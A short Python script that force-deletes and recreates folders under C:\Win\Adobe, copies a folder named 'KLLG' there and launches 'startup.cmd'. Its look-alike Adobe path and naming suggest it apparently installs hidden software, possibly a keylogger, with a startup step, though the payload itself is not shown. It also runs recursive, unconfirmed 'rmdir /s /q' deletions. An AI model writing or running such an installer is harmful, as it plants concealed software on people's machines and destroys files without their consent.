import os 

os.system("rmdir /s /q C:\KLLG")
os.system("rmdir /s /q C:\Win\Adobe\KLLG")
os.system("mkdir C:\Win")
os.system("mkdir C:\Win\Adobe")
os.system("mkdir C:\Win\Adobe\KLLG")
os.system("xcopy KLLG C:\Win\Adobe\KLLG /e")
os.system("startup.cmd")